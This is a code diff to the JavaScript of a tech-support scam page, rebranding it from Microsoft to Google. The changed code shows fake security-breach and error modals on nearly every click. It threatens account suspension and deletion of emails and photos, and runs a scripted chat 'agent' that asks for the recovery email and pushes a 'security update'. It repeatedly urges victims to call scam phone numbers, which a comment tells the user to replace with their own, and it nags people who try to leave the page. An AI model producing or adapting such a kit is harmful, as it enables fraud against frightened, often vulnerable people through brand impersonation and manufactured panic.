@@ -1,13 +1,13 @@
 document.addEventListener('DOMContentLoaded', function() {
     const signInBtn = document.getElementById('signInBtn');
     const productCards = document.querySelectorAll('.product-card');
-    const chatBtn = document.getElementById('chatBtn');
-    const callBtn = document.getElementById('callBtn');
-    const ticketBtn = document.getElementById('ticketBtn');
-    const navLinks = document.querySelectorAll('.nav-link');
-    const topSignInBtn = document.querySelector('.btn-secondary');
-    const cantSignInLink = document.querySelector('.cant-sign-in');
-    const showMoreLink = document.querySelector('.show-more-link');
+    const menuBtn = document.getElementById('menuBtn');
+    const appsBtn = document.getElementById('appsBtn');
+    const feedbackBtn = document.getElementById('feedbackBtn');
+    const helpLinks = document.querySelectorAll('.help-link');
+    const showMoreBtn = document.getElementById('showMoreBtn');
+    const searchBtn = document.getElementById('searchBtn');
+    const searchInput = document.getElementById('searchInput');
     const errorModal = document.getElementById('errorModal');
     const closeModal = document.getElementById('closeModal');
     const callNowBtn = document.getElementById('callNowBtn');
@@ -19,12 +19,12 @@ document.addEventListener('DOMContentLoaded', function() {
     const chatBody = document.getElementById('chatBody');
 
     const errorCodes = [
-        'WIN-ERR-0x8007045D',
-        'SEC-THREAT-0x80240017',
-        'SYS-ERR-0x800F0984',
-        'VIRUS-DETECT-0x80070005',
-        'FIREWALL-0x80070422',
-        'REGISTRY-0x8007000D'
+        'GOOG-SEC-0x4A7B',
+        'GOOG-ERR-0x8F3D',
+        'ACCOUNT-0x2B9E',
+        'GMAIL-SEC-0x7C1A',
+        'DRIVE-0x9D4F',
+        'CHROME-0x5E8B'
     ];
 
     // Replace example numbers with your own.
@@ -36,14 +36,14 @@ document.addEventListener('DOMContentLoaded', function() {
     ];
 
     const chatResponses = [
-        "I understand your concern. Let me help you with that right away.",
-        "That sounds like a serious issue. Can you tell me more about when this started?",
-        "I'm going to run a quick diagnostic on your system. Please hold on.",
-        "This appears to be a critical security threat. We need to address this immediately.",
-        "For your security, I'll need to verify your Windows license. What's your product key?",
-        "I can see the issue from here. Let me connect you with our senior technician.",
-        "This requires immediate attention. Can I get remote access to fix this?",
-        "Your system is at risk. We need to install our security patch right away."
+        "I can see there's an issue with your Google account security. Let me help you resolve this immediately.",
+        "That's concerning. I'm detecting unauthorized access attempts on your account.",
+        "Your account shows signs of compromise. We need to secure it right away.",
+        "I'm running a security scan now. This appears to be a critical security breach.",
+        "For your protection, I need to verify your account details. Can you provide your recovery email?",
+        "This requires immediate action. Let me transfer you to our security specialist.",
+        "Your Google services are at risk. We need to install our security update immediately.",
+        "I can see multiple failed login attempts. Your account needs emergency protection."
     ];
 
     init();
@@ -60,27 +60,16 @@ document.addEventListener('DOMContentLoaded', function() {
 
     function setupEventListeners() {
         signInBtn.addEventListener('click', handleSignIn);
+        menuBtn.addEventListener('click', showAccountError);
+        appsBtn.addEventListener('click', showAccountError);
+        feedbackBtn.addEventListener('click', showSystemError);
+        showMoreBtn.addEventListener('click', showSystemError);
 
-        navLinks.forEach(link => {
-            link.addEventListener('click', function(e) {
-                e.preventDefault();
-                showFirewallError();
-            });
-        });
-
-        topSignInBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            showFirewallError();
-        });
-
-        cantSignInLink.addEventListener('click', function(e) {
-            e.preventDefault();
-            showSysError();
-        });
-
-        showMoreLink.addEventListener('click', function(e) {
-            e.preventDefault();
-            showSysError();
+        searchBtn.addEventListener('click', handleSearch);
+        searchInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                handleSearch();
+            }
         });
 
         productCards.forEach(card => {
@@ -90,9 +79,12 @@ document.addEventListener('DOMContentLoaded', function() {
             });
         });
 
-        if (chatBtn) chatBtn.addEventListener('click', openChat);
-        if (callBtn) callBtn.addEventListener('click', showCallInfo);
-        if (ticketBtn) ticketBtn.addEventListener('click', showTicketForm);
+        helpLinks.forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                showSystemError();
+            });
+        });
 
         closeModal.addEventListener('click', hideErrorModal);
         callNowBtn.addEventListener('click', handleCallNow);
@@ -126,8 +118,17 @@ document.addEventListener('DOMContentLoaded', function() {
         setTimeout(() => {
             signInBtn.textContent = 'Sign in';
             signInBtn.disabled = false;
-            showErrorModal();
+            showAccountError();
         }, 2000);
+    }
+
+    function handleSearch() {
+        const query = searchInput.value.trim();
+        if (query) {
+            setTimeout(() => {
+                showErrorModal();
+            }, 1500);
+        }
     }
 
     function handleProductClick(product) {
@@ -145,29 +146,37 @@ document.addEventListener('DOMContentLoaded', function() {
 
     function showProductSpecificError(product) {
         const productErrors = {
-            'microsoft365': 'Microsoft 365 subscription verification failed',
-            'office': 'Office license activation error detected',
-            'windows': 'Windows security vulnerability found',
-            'xbox': 'Xbox Live account security breach detected',
-            'surface': 'Surface device hardware malfunction',
-            'copilot': 'Copilot AI service security alert',
-            'dynamics': 'Dynamics 365 data breach detected',
-            'intune': 'Intune security policy violation',
-            'azure': 'Azure subscription security threat',
-            'server': 'Server security vulnerability detected',
-            'accessories': 'Device driver security risk',
-            'advertising': 'Advertising account security breach'
+            'chrome': 'Chrome browser security vulnerability detected',
+            'account': 'Google Account unauthorized access detected',
+            'youtube': 'YouTube account security breach detected',
+            'gmail': 'Gmail security threat identified',
+            'play': 'Google Play Store payment security issue',
+            'search': 'Google Search history compromised',
+            'adsense': 'AdSense account security violation',
+            'gemini': 'Gemini AI access security breach',
+            'pixel': 'Pixel device security compromise',
+            'maps': 'Google Maps location data breach',
+            'cloud': 'Google Cloud security vulnerability',
+            'ads': 'Google Ads account unauthorized access',
+            'photos': 'Google Photos privacy breach detected',
+            'families': 'Family account security compromise',
+            'fi': 'Google Fi wireless security threat',
+            'nest': 'Google Nest device security breach',
+            'pay': 'Google Pay transaction security alert',
+            'store': 'Google Store payment security issue',
+            'drive': 'Google Drive file access violation',
+            'accessibility': 'Accessibility settings security breach'
         };
 
-        const errorMessage = productErrors[product] || 'System security threat detected';
+        const errorMessage = productErrors[product] || 'Google services security threat detected';
         
         const modalBody = document.querySelector('.modal-body');
         modalBody.innerHTML = `
-            <div class="error-icon">⚠️</div>
+            <div class="error-icon">🚨</div>
             <p><strong>${errorMessage}</strong></p>
-            <p>Your system requires immediate attention to prevent data loss.</p>
+            <p>Your Google account and services require immediate security verification.</p>
             <p><strong>Error Code:</strong> <span id="errorCode">${errorCodes[Math.floor(Math.random() * errorCodes.length)]}</span></p>
-            <p>Contact Microsoft Support immediately to resolve this critical issue.</p>
+            <p>Contact Google Support now to prevent data loss and account suspension.</p>
             <div class="contact-info">
                 <p><strong>Support Number:</strong> <span class="phone-number">${supportNumbers[Math.floor(Math.random() * supportNumbers.length)]}</span></p>
             </div>
@@ -176,19 +185,19 @@ document.addEventListener('DOMContentLoaded', function() {
         showErrorModal();
     }
 
-    function showFirewallError() {
+    function showAccountError() {
         const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
         
-        document.getElementById('errorCode').textContent = 'FIREWALL-0x80070422';
+        document.getElementById('errorCode').textContent = 'ACCOUNT-0x2B9E';
         document.querySelector('.phone-number').textContent = randomPhone;
         
         const modalBody = document.querySelector('.modal-body');
         modalBody.innerHTML = `
-            <div class="error-icon">🔥</div>
-            <p><strong>CRITICAL FIREWALL BREACH DETECTED</strong></p>
-            <p>Your firewall has been compromised and disabled by malicious software.</p>
-            <p><strong>Error Code:</strong> <span id="errorCode">FIREWALL-0x80070422</span></p>
-            <p>Immediate action required to prevent data theft and system damage.</p>
+            <div class="error-icon">🔐</div>
+            <p><strong>GOOGLE ACCOUNT SECURITY BREACH</strong></p>
+            <p>Unauthorized access detected from multiple suspicious locations.</p>
+            <p><strong>Error Code:</strong> <span id="errorCode">ACCOUNT-0x2B9E</span></p>
+            <p>Your account will be suspended in 24 hours if not verified immediately.</p>
             <div class="contact-info">
                 <p><strong>Emergency Support:</strong> <span class="phone-number">${randomPhone}</span></p>
             </div>
@@ -197,19 +206,19 @@ document.addEventListener('DOMContentLoaded', function() {
         showErrorModal();
     }
 
-    function showSysError() {
+    function showSystemError() {
         const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
         
-        document.getElementById('errorCode').textContent = 'SYS-ERR-0x800F0984';
+        document.getElementById('errorCode').textContent = 'GOOG-ERR-0x8F3D';
         document.querySelector('.phone-number').textContent = randomPhone;
         
         const modalBody = document.querySelector('.modal-body');
         modalBody.innerHTML = `
             <div class="error-icon">⚠️</div>
-            <p><strong>SYSTEM ERROR DETECTED</strong></p>
-            <p>Critical system files have been corrupted or deleted.</p>
-            <p><strong>Error Code:</strong> <span id="errorCode">SYS-ERR-0x800F0984</span></p>
-            <p>Your computer may shut down unexpectedly to prevent further damage.</p>
+            <p><strong>GOOGLE SERVICES ERROR</strong></p>
+            <p>Critical system malfunction affecting all Google services.</p>
+            <p><strong>Error Code:</strong> <span id="errorCode">GOOG-ERR-0x8F3D</span></p>
+            <p>Data synchronization has been disabled to prevent corruption.</p>
             <div class="contact-info">
                 <p><strong>Support Number:</strong> <span class="phone-number">${randomPhone}</span></p>
             </div>
@@ -222,8 +231,10 @@ document.addEventListener('DOMContentLoaded', function() {
         const randomErrorCode = errorCodes[Math.floor(Math.random() * errorCodes.length)];
         const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
         
-        document.getElementById('errorCode').textContent = randomErrorCode;
-        document.querySelector('.phone-number').textContent = randomPhone;
+        if (!document.getElementById('errorCode')) {
+            document.getElementById('errorCode').textContent = randomErrorCode;
+            document.querySelector('.phone-number').textContent = randomPhone;
+        }
         
         errorModal.style.display = 'block';
         document.body.style.overflow = 'hidden';
@@ -244,10 +255,10 @@ document.addEventListener('DOMContentLoaded', function() {
         
         const urgentDiv = document.createElement('div');
         urgentDiv.innerHTML = `
-            <div style="background: #d13438; color: white; padding: 20px; text-align: center; font-weight: bold;">
-                ⚠️ CRITICAL SECURITY ALERT ⚠️<br>
+            <div style="background: #ea4335; color: white; padding: 20px; text-align: center; font-weight: bold;">
+                🚨 CRITICAL GOOGLE SECURITY ALERT 🚨<br>
                 Call immediately: ${phoneNumber}<br>
-                <small>Do not close this window or restart your computer</small>
+                <small>Do not sign out or close this browser</small>
             </div>
         `;
         
@@ -257,8 +268,8 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     function handleIgnoreWarning() {
-        const warningCount = parseInt(localStorage.getItem('warningCount') || '0') + 1;
-        localStorage.setItem('warningCount', warningCount.toString());
+        const warningCount = parseInt(localStorage.getItem('googleWarningCount') || '0') + 1;
+        localStorage.setItem('googleWarningCount', warningCount.toString());
         
         if (warningCount < 3) {
             hideErrorModal();
@@ -272,9 +283,9 @@ document.addEventListener('DOMContentLoaded', function() {
             const modalBody = document.querySelector('.modal-body');
             modalBody.innerHTML = `
                 <div class="error-icon">🚨</div>
-                <h3 style="color: #d13438; margin-bottom: 20px;">FINAL WARNING</h3>
-                <p><strong>Your system is about to be permanently damaged!</strong></p>
-                <p>This is your last chance to save your files and personal data.</p>
+                <h3 style="color: #ea4335; margin-bottom: 20px;">FINAL SECURITY WARNING</h3>
+                <p><strong>Your Google account is about to be permanently disabled!</strong></p>
+                <p>All your data, emails, photos, and documents will be permanently deleted.</p>
                 <div class="contact-info">
                     <p><strong>Emergency Support:</strong> <span class="phone-number">${supportNumbers[0]}</span></p>
                 </div>
@@ -287,11 +298,11 @@ document.addEventListener('DOMContentLoaded', function() {
         chatInput.focus();
         
         setTimeout(() => {
-            addChatMessage('agent', 'I can see you\'re having some technical issues. Let me help you right away.');
+            addChatMessage('agent', 'I can see you\'re experiencing Google account security issues. Let me help you immediately.');
         }, 2000);
         
         setTimeout(() => {
-            addChatMessage('agent', 'I\'m detecting some security vulnerabilities on your system. This needs immediate attention.');
+            addChatMessage('agent', 'I\'m detecting unauthorized access to your Google services. This needs urgent attention.');
         }, 5000);
     }
 
@@ -312,7 +323,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 if (Math.random() > 0.6) {
                     setTimeout(() => {
                         const phoneNumber = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
-                        addChatMessage('agent', `For faster resolution, please call our emergency line: ${phoneNumber}`);
+                        addChatMessage('agent', `For immediate assistance, please call our security line: ${phoneNumber}`);
                     }, 2000);
                 }
             }, 1000 + Math.random() * 2000);
@@ -333,25 +344,6 @@ document.addEventListener('DOMContentLoaded', function() {
         
         chatBody.appendChild(messageDiv);
         chatBody.scrollTop = chatBody.scrollHeight;
-    }
-
-    function showCallInfo() {
-        const phoneNumber = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
-        alert(`Call Microsoft Support at: ${phoneNumber}\n\nOur specialists are available 24/7 to help with your technical issues.`);
-        
-        if (/Mobi|Android/i.test(navigator.userAgent)) {
-            window.location.href = `tel:${phoneNumber}`;
-        }
-    }
-
-    function showTicketForm() {
-        const userInfo = prompt('Please describe your issue:');
-        if (userInfo) {
-            setTimeout(() => {
-                alert('Due to the critical nature of your issue, please call our emergency support line immediately for faster assistance.');
-                showCallInfo();
-            }, 1000);
-        }
     }
 
     function addDynamicEffects() {
@@ -408,7 +400,7 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 
     window.addEventListener('beforeunload', function(e) {
-        const message = 'WARNING: Leaving this page may cause permanent damage to your system. Contact Microsoft Support first.';
+        const message = 'WARNING: Leaving this page may result in permanent Google account suspension. Contact Support first.';
         e.returnValue = message;
         return message;
     });
